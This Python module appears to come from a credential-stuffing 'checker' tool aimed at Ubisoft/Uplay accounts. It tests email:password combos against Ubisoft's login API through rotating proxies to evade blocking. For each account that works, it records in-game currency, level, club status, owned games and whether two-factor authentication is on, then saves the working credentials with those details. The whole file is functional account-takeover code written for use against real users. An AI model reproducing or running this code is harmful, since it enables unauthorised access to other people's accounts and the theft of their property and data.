from modules.variables import Checker
from modules.functions import bad_proxy, log,save,set_proxy
from requests import get,post
from base64 import b64encode

def check(email:str,password:str):
    retries = 0
    combo = b64encode(f"{email}:{password}".encode()).decode()
    while retries != Checker.retries:
        proxy = set_proxy()
        proxy_set = set_proxy(proxy)

        header_1 = {
            "Content-Type": "application/json",
            "Authorization": f"Basic {combo}",
            "Ubi-AppId": "39baebad-39e5-4552-8c25-2c9b919064e2"
        }
        header_2 = {
            "authorization": "",
            "GenomeId": "4f9d4adf-3646-4058-8553-c7b48df556e0",
            "Ubi-AppId": "39baebad-39e5-4552-8c25-2c9b919064e2"
        }
        data = {"rememberMe":True}
        try:
            response = post("https://public-ubiservices.ubi.com/v3/profiles/sessions",json=data,headers=header_1,proxies=proxy_set,timeout=Checker.timeout)
            if "Invalid credentials" in response.text:
                retries += 1
            elif "ticket" in response.text or "userId" in response.text:
                ticket = response.json()["ticket"]
                user_id = response.json()["userId"]
                header_2["authorization"] = f"Ubi_v1 t={ticket}"

                capture = get(f"https://public-ubiservices.ubi.com/v1/profiles/club?profileIds={user_id}",headers=header_2,proxies=proxy_set,timeout=Checker.timeout).json()[0]
                units = capture["units"]
                level = capture["currentLevel"]["levelNumber"]
                tier = capture["currentLevel"]["tierName"]
                club_member = capture["isClubMember"]

                games = []
                game_list = get(f"https://wspuplay-ext.ubi.com/UplayServices/WinServices/GameClientServices.svc/REST/JSON/GetGamePlatformsByUserId/{user_id}/en-US/?onlyOwned=true&rowsCount=-1&pCodeIssuer=PC&country=EN",headers=header_2,proxies=proxy_set,timeout=Checker.timeout).json()["ItemList"]
                for game in game_list:
                    games.append(game["Name"])
                
                response = get("https://public-ubiservices.ubi.com/v2/profiles/me/2fa",headers=header_2,proxies=proxy_set,timeout=Checker.timeout).text
                if "active\":true" in response:
                    if not Checker.cui:
                        log("custom",email+":"+password,"Uplay")
                    save("Uplay","custom",Checker.time,email+":"+password+f" | Units: {units} | Level: {level} | Tier: {tier} | Club Member: {club_member} | Total Games: {len(games)} | Games List: {games}")
                    Checker.custom += 1
                    Checker.cpm += 1
                    return
                else:
                    if not Checker.cui:
                        log("good",email+":"+password,"Uplay")
                    save("Uplay","good",Checker.time,email+":"+password+f" | Units: {units} | Level: {level} | Tier: {tier} | Club Member: {club_member} | Total Games: {len(games)} | Games List: {games}")
                    Checker.good += 1
                    Checker.cpm += 1
                    return
            else:
                raise
        except:
            bad_proxy(proxy)
            Checker.errors += 1
    Checker.bad += 1
    Checker.cpm += 1
    return